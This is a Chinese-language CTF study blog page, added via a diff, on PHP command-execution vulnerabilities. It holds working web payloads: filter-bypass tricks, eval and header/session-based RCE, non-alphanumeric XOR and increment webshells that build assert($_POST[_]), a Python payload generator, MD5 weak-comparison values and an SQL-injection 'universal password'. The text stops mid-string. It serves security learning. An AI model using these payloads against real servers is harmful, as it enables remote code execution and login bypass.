@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="# 命令执行漏洞  passthru 直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。  system  shell_exec 反引号包裹 执行命令但是没有返回需要配合echo&#x2F;print  popen() proc_open()都没有回显,echo还需要配合fread&#x2F;fgets 例:echo fresd(命令)  b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞">
+<meta property="og:url" content="http://example.com/2026/09/16/59-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Glut4micum">
+<meta property="og:description" content="# 命令执行漏洞  passthru 直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。  system  shell_exec 反引号包裹 执行命令但是没有返回需要配合echo&#x2F;print  popen() proc_open()都没有回显,echo还需要配合fread&#x2F;fgets 例:echo fresd(命令)  b">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-16T14:21:36.000Z">
+<meta property="article:modified_time" content="2026-09-16T14:21:36.000Z">
+<meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/09/16/59-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>命令执行漏洞 | Glut4micum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glut4micum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/16/59-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+      <meta itemprop="name" content="谷氨酸棒状杆菌">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glut4micum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-09-16 22:21:36" itemprop="dateCreated datePublished" datetime="2026-09-16T22:21:36+08:00">2026-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">知识笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="本文总阅读两 fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        
+# 命令执行漏洞
+
+passthru 直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。
+
+system
+
+shell_exec 反引号包裹 执行命令但是没有返回需要配合echo/print
+
+popen() proc_open()都没有回显,echo还需要配合fread/fgets 例:echo fresd(命令)
+
+bash:Linux系统下执行命令
+
+两个反应号包裹` `
+
+误无回显输入；再输入命令截断试试
+
+# LD_PRELOAD绕过
+
+函数被禁止得特别多的时候,修改库文件
+
+### mail函数
+
+1s3u10t
+
+### imagick函数
+
+ls||这样就不会继续执行">/dev/null 2>&1",即可回显
+
+### eval嵌套
+
+?c=eval($_GET[1]);&1=passthru("tac%09fla*");
+
+### 分号被过滤时
+
+=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
+
+### 空格绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">$IFS;$&#123;IFS&#125;;$IFS$9内置空格符/加括号区别变量</span><br><span class="line">&lt; 重定向符</span><br><span class="line">当suystem(&quot;cat fla*&quot;)绕过空格时,因为是双引号,所以需要转义字符\</span><br><span class="line">suystem(&quot;cat\$IFS\$9fla*&quot;)</span><br></pre></td></tr></table></figure>
+
+### 文件名绕过
+
+1. 通配符?代表单个字符 *模糊匹配,代表任何一个字符串
+2. 单双引号
+3. 反斜线\绕过,取消符号作用
+4. $1$9 $@ $*等变量绕过
+5. 内联执行即定义变量$a=fl;$b=ag;cat $a$b;
+6. 利用Linux环境变量{$PATH:5;1} 即在PATH从显示出来的字符串取第五个字符开始取,取一位
+
+### 文件读取命令绕过
+
+1. tac
+2. cat
+3. more
+4. less
+5. nl//显示行数
+6. od 二进制读取
+7. xxd 十六进制读取
+8. sort
+9. uniq
+10. file -f
+11. grep查找某些字符串
+
+### 编码绕过
+
+base64编码system(echo |base64 -d|bash)
+
+base32
+
+HEX即ASCII码(echo |xxd -r -p|bash
+
+shellcode编码:十六进制,printf()|bash即可执行
+
+### 无回显时间盲注
+
+1. sleep:命令执行的时间
+2. awk NR 回显第几行
+3. cut -c 数字 读取第几个字符
+4. if语句后面得加空格
+
+### 长度绕过
+
+1. > 写入内容为覆盖原文件内容,单独用创建一个文件
+2. >>续写,追加内容
+3. \ 换行
+4. ls -t 按照创建时间顺序排序
+5. vim写入内容
+6. sh 执行命令,控制长度用文件执行
+7. dir *第一个文件当指令,第二个文件当参数
+8. $(dir *)
+9. nc -vp 端口,监听
+
+### 请求头绕过(php7.3以后)
+
+1. print_r(getallheaders());可以看到请求头
+2. end(getallheaders());最后一个请求头
+3. pos(getallheaders());第一个请求头
+4. eval(pos(getallheaders());)自己添加一个请求头然后读取执行
+
+### 全局变量RCE
+
+1. print_r(end(pos(get_defined_vars())));&cmd=system('ls');返回一定义变量值,所组成的数组
+2. eval(end(pos(get_defined_vars())));&cmd=system('ls');
+
+### session print_r(arrary_rand(pos(getallheaders())));
+
+session_star():启动新绘画或者重用现有会话,成功返回true,失败返回false
+
+?code=shoe_source(session_id(session_star()))使用burp suite抓包修改cookie即可读取文件内容
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/25003085-image.png)
+
+eval(hex2bin(session_id(session_star()))),将cookie的想要执行的内容进行hax编码然后上传
+
+### scandir读取
+
+1. scandir(路径)类似于ls,无回显,配合print_r
+2. getcwd()显示当前路径
+3. current()读取第一个内容
+4. next()的去第二个内容
+5. array_reverse()倒叙排列
+6. array_flip()键名和键值对调
+7. arrary_rand()随机显示
+8. chdir()切换目录
+9. strrev()反转字符串
+10. crypt()加密
+11. localeconv()查看当前文件路径
+12. dirname()查看上级目录名
+13. ord()对第一个字符编码
+14. chr()对最后一个字符解码
+
+查看当前目录:scandir(getcwd());
+
+查看上级目录:print_r(scandir(dirname(getcwd())))
+
+查看根目录文件print_r(scandir(chr(ord(strrev(crypt(serialize(arry()))))))
+
+**当文件不在第一第二或者倒数第一第二的位置时print_r(arrary_rand(array_flip()))**
+
+### 弱类型比较
+
+php在弱类型比较==时会先将其类型转化为相同再去比较,该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
+
+"0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等
+
+# 无字母数字命令执行
+
+## 取反
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+
+## 异或运算:
+
+a和b进行异或运算,相同结果为0;不同结果为1,对应ASCII码转为二进制,再比较每一位是否相同,再将结果十进制对应ASCII码
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;A&#x27;</span>^<span class="string">&#x27;?&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+异或脚本
+
+poc
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);$__=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+语句翻译为:assert($_POST[_]);
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/2922564f-image.png)
+
+即可进行rce
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span> </span><br><span class="line">ans2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): <span class="comment">#设置i的范围</span></span><br><span class="line">    c=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="comment">#将i转换成ascii对应的字符，并赋值给c</span></span><br><span class="line">    tmp = re.<span class="keyword">match</span>(<span class="string">r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span>,c,re.I)</span><br><span class="line">    <span class="comment">#设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span></span><br><span class="line">    <span class="keyword">if</span>(tmp):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line">        <span class="comment">#在数组中增加i，这些就是未被系统过滤掉的字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eval(&quot;echo($c);&quot;);</span></span><br><span class="line">mya=<span class="string">&quot;system&quot;</span>  <span class="comment">#函数名 这里修改！</span></span><br><span class="line">myb=<span class="string">&quot;dir&quot;</span>      <span class="comment">#参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfun</span>(<span class="params">k,my</span>): <span class="comment">#自定义函数</span></span><br><span class="line">    <span class="keyword">global</span> ans1 <span class="comment">#引用全局变量ans1，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">global</span> ans2 <span class="comment">#引用全局变量ans2，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(a)): <span class="comment">#设置循环范围为（0，a）注：a为未被过滤的字符数量 </span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(a)): <span class="comment">#在上个循环的条件下设置j的范围</span></span><br><span class="line">            <span class="keyword">if</span>(a[i]^a[j]==<span class="built_in">ord</span>(my[k])):</span><br><span class="line">                ans1+=<span class="built_in">chr</span>(a[i]) <span class="comment">#ans1=ans1+chr(a[i])</span></span><br><span class="line">                ans2+=<span class="built_in">chr</span>(a[j]) <span class="comment">#ans2=ans2+chr(a[j])</span></span><br><span class="line">                <span class="keyword">return</span>;<span class="comment">#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(mya)): <span class="comment">#设置k的范围</span></span><br><span class="line">    myfun(x,mya)<span class="comment">#引用自定义的函数</span></span><br><span class="line">data1=<span class="string">&quot;(&#x27;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;&#x27;^&#x27;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;&#x27;)&quot;</span> <span class="comment">#data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span></span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span><span class="comment">#对ans1进行重新赋值</span></span><br><span class="line">ans2=<span class="string">&quot;&quot;</span><span class="comment">#对ans2进行重新赋值</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(myb)):<span class="comment">#设置k的范围为(0,len(myb))</span></span><br><span class="line">    myfun(k,myb)<span class="comment">#再次引用自定义函数</span></span><br><span class="line">data2=<span class="string">&quot;(\&quot;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data2)</span><br></pre></td></tr></table></figure>
+
+## 自增
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+### php命令执行函数
+
+system() ; exec() ; shell_exec() ;passthru() ; popen() ; 反引号``
+
+​
+
+## MD5加密弱比较
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure>
+
+若条件语句如下,则采用0e绕过
+
+$x=0e215962017
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$x</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$x</span>))</span><br></pre></td></tr></table></figure>
+
+常用的MD50e开头
+
+> QNKCDZO240610708byGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a  0e215962017万能密码: ffifdyop
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> ’admin’ where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)<span class="comment">//用ffifdyop</span></span><br></pre></td></tr></table></figure>
+
+> 首先要知道md($pass,true)的含义MD5报文将以原始 16字符二进制格式返回ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c在转换成字符串为’or’6乱码Select * from ’admin’ where password=‘or’6乱码相当于万能密码$s1 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%